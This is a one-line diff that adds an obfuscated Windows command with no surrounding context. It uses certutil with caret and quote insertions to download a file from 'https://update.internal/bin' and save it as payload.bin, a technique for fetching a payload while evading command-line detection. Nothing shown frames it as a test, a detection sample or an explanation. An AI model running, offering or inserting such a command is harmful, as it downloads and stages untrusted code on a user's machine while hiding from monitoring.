@@ -1,0 +1,1 @@
+c^e^r^t""u""t""i""l.e^x^e -u^r^l^c^a^c^h^e -s^p^l^i^t -f "https://update.internal/bin" payload.bin
